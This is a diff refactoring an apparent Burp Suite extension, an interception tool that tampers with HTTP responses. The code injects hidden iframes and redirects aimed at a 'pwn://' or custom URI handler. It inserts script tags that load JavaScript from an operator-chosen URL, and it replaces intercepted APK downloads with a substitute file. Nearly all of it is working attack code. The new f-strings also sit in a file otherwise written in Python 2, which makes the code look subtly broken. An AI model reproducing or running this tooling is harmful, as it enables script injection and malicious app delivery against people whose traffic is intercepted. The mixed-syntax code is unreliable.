@@ -28,20 +28,26 @@ class BurpExtender(IBurpExtender, ITab, IHttpListener, IMessageEditorController,
     #
 
     def injectPwn(self, messageInfo):
-        
+
         # Get response
         response = messageInfo.getResponse()
         responseParsed = self._helpers.analyzeResponse(response)
         body = self._callbacks.getHelpers().bytesToString(response)[responseParsed.getBodyOffset():]
         headers = responseParsed.getHeaders()
 
-        if not self.tools[2].getTickBoxTicked():
-            # Method 1 - silent invocation - Inject iframe loading from pwn:// into responses (case insensitive) 
-            changedContent = re.sub(re.compile(r'</body>', re.IGNORECASE), '<iframe src="pwn://lol" width=1 height=1 style="visibility:hidden;position:absolute"></iframe></body>', body)
-        else:
-            # Method 2 - active invocation - redirect to the pwn:// handler (this is a requirement for versions of Chromium >= 25)
-            changedContent = re.sub(re.compile(r'</body>', re.IGNORECASE), '<script>window.location="pwn://www.google.com/pluginerror.html"</script></body>', body)
-
+        changedContent = (
+            re.sub(
+                re.compile(r'</body>', re.IGNORECASE),
+                '<script>window.location="pwn://www.google.com/pluginerror.html"</script></body>',
+                body,
+            )
+            if self.tools[2].getTickBoxTicked()
+            else re.sub(
+                re.compile(r'</body>', re.IGNORECASE),
+                '<iframe src="pwn://lol" width=1 height=1 style="visibility:hidden;position:absolute"></iframe></body>',
+                body,
+            )
+        )
 
         changedContentBytes = self._callbacks.getHelpers().stringToBytes(changedContent)
 
@@ -55,7 +61,7 @@ class BurpExtender(IBurpExtender, ITab, IHttpListener, IMessageEditorController,
         return
 
     def injectJs(self, messageInfo):
-        
+
         # Get response
         response = messageInfo.getResponse()
         responseParsed = self._helpers.analyzeResponse(response)
@@ -67,7 +73,12 @@ class BurpExtender(IBurpExtender, ITab, IHttpListener, IMessageEditorController,
         # Inject arbitrary script into responses
         changedContent = re.sub(re.compile(r'<head>', re.IGNORECASE), '<head><script src="' + editBoxStr + '"></script>', body)
         changedContent = re.sub(re.compile(r'</body>', re.IGNORECASE), '<script src="' + editBoxStr + '"></script></body>', changedContent)
-        changedContent = re.sub(re.compile(r'<content>', re.IGNORECASE), '<content>&lt;script src=&quot;' + editBoxStr + '&quot;&gt;&lt;/script&gt;', changedContent)
+        changedContent = re.sub(
+            re.compile(r'<content>', re.IGNORECASE),
+            f'<content>&lt;script src=&quot;{editBoxStr}&quot;&gt;&lt;/script&gt;',
+            changedContent,
+        )
+
 
         changedContentBytes = self._callbacks.getHelpers().stringToBytes(changedContent)
         final = self._callbacks.getHelpers().buildHttpMessage(headers, changedContentBytes);
@@ -75,7 +86,11 @@ class BurpExtender(IBurpExtender, ITab, IHttpListener, IMessageEditorController,
         # Set the response if the content changed and add to log
         if body != changedContent:
             messageInfo.setResponse(final)
-            self.addLog(self._helpers.analyzeRequest(messageInfo).getUrl(), "Injected JavaScript from " + editBoxStr)
+            self.addLog(
+                self._helpers.analyzeRequest(messageInfo).getUrl(),
+                f"Injected JavaScript from {editBoxStr}",
+            )
+
 
         return
 
@@ -114,12 +129,14 @@ class BurpExtender(IBurpExtender, ITab, IHttpListener, IMessageEditorController,
 
             # Add to information for use by injectAPK()
             version = ""
-            if str(response.version) == "11":
-                version = "HTTP/1.1"
-            else:
-                version = "HTTP/1.0"
-            self.apkRequests[reqPath] = [reqUrl, version + " " + str(response.status) + " " + str(response.reason), responseHeaders]
-            print self.apkRequests[reqPath]
+            version = "HTTP/1.1" if str(response.version) == "11" else "HTTP/1.0"
+            self.apkRequests[reqPath] = [
+                reqUrl,
+                f"{version} {str(response.status)} {str(response.reason)}",
+                responseHeaders,
+            ]
+
+            self.addLog(reqUrl, "Got request for APK...")
 
             # Instead of passing request - change host to www.google.com which will be non existent
             httpService = messageInfo.getHttpService()
@@ -137,35 +154,25 @@ class BurpExtender(IBurpExtender, ITab, IHttpListener, IMessageEditorController,
         reqPort = reqUrl.getPort()
 
         # If it ends in .apk then replace it!
-        if reqPath.upper().endswith(".APK"):
-
-            # Check this is a request we have seen
-            if reqPath in self.apkRequests:
-
-                # Get stored url and header
-                res = self.apkRequests[reqPath]
-                url = res[0]
-                httpStatus = res[1]
-                headers = []
-                headers.append(httpStatus)
-                for i in res[2]:
-                    headers.append(i[0] + ': ' + ''.join(i[1:]))
-
-                # Open and read APK from specified path
-                f = open(self.tools[1].getEditBox())
+        if reqPath.upper().endswith(".APK") and reqPath in self.apkRequests:
+            # Get stored url and header
+            res = self.apkRequests[reqPath]
+            url = res[0]
+            httpStatus = res[1]
+            headers = [httpStatus]
+            headers.extend(f'{i[0]}: ' + ''.join(i[1:]) for i in res[2])
+            with open(self.tools[1].getEditBox()) as f:
                 changedContentBytes = f.read()
-                f.close()
+            final = self._callbacks.getHelpers().buildHttpMessage(headers, changedContentBytes);
 
-                final = self._callbacks.getHelpers().buildHttpMessage(headers, changedContentBytes);
-                
-                # Replace response with new APK
-                messageInfo.setResponse(final)
-                self.addLog(url, "Replaced APK!")
+            # Replace response with new APK
+            messageInfo.setResponse(final)
+            self.addLog(url, "Replaced APK!")
 
         return
 
     def injectCustomURI(self, messageInfo):
-        
+
         # Get response
         response = messageInfo.getResponse()
         responseParsed = self._helpers.analyzeResponse(response)
@@ -174,12 +181,21 @@ class BurpExtender(IBurpExtender, ITab, IHttpListener, IMessageEditorController,
 
         uri = self.tools[3].getEditBox()
 
-        if not self.tools[3].getTickBoxTicked():
-            # Method 1 - silent invocation - Inject iframe loading from pwn:// into responses (case insensitive) 
-            changedContent = re.sub(re.compile(r'</body>', re.IGNORECASE), '<iframe src="' + uri + '" width=1 height=1 style="visibility:hidden;position:absolute"></iframe></body>', body)
-        else:
-            # Method 2 - active invocation - redirect to the pwn:// handler (this is a requirement for versions of Chromium >= 25)
-            changedContent = re.sub(re.compile(r'</body>', re.IGNORECASE), '<script>window.location="' + uri + '"</script></body>', body)
+        changedContent = (
+            re.sub(
+                re.compile(r'</body>', re.IGNORECASE),
+                '<script>window.location="' + uri + '"</script></body>',
+                body,
+            )
+            if self.tools[3].getTickBoxTicked()
+            else re.sub(
+                re.compile(r'</body>', re.IGNORECASE),
+                '<iframe src="'
+                + uri
+                + '" width=1 height=1 style="visibility:hidden;position:absolute"></iframe></body>',
+                body,
+            )
+        )
 
         changedContentBytes = self._callbacks.getHelpers().stringToBytes(changedContent)
 
@@ -307,9 +323,7 @@ class BurpExtender(IBurpExtender, ITab, IHttpListener, IMessageEditorController,
             return "Time"
         if columnIndex == 1:
             return "URL"
-        if columnIndex == 2:
-            return "Action"
-        return ""
+        return "Action" if columnIndex == 2 else ""
 
     def getValueAt(self, rowIndex, columnIndex):
         logEntry = self._log.get(rowIndex)
@@ -317,9 +331,7 @@ class BurpExtender(IBurpExtender, ITab, IHttpListener, IMessageEditorController,
             return logEntry._time
         if columnIndex == 1:
             return logEntry._url
-        if columnIndex == 2:
-            return logEntry._action
-        return ""
+        return logEntry._action if columnIndex == 2 else ""
 
 #
 # extend JTable to handle cell selection
@@ -421,10 +433,12 @@ class Tool:
     def openBrowseDialog(self, button):
         dialog = swing.JFileChooser()
         c = dialog.showOpenDialog(None)
-        if dialog is not None:
-            if (dialog.currentDirectory and dialog.selectedFile.name) is not None:
-                loc = str(dialog.currentDirectory) + os.sep + str(dialog.selectedFile.name)
-                self.editBox.setText(loc)
+        if (
+            dialog is not None
+            and (dialog.currentDirectory and dialog.selectedFile.name) is not None
+        ):
+            loc = str(dialog.currentDirectory) + os.sep + str(dialog.selectedFile.name)
+            self.editBox.setText(loc)
 
     def getPanel(self):
         return self.panel
@@ -433,10 +447,7 @@ class Tool:
         return self.editBox.getText()
 
     def getButtonEnabled(self):
-        if (self.enableButton.getText() == "Disabled"):
-            return False
-        else:
-            return True
+        return self.enableButton.getText() != "Disabled"
 
     def getRequestExecutor(self):
         return self.requestExecutor
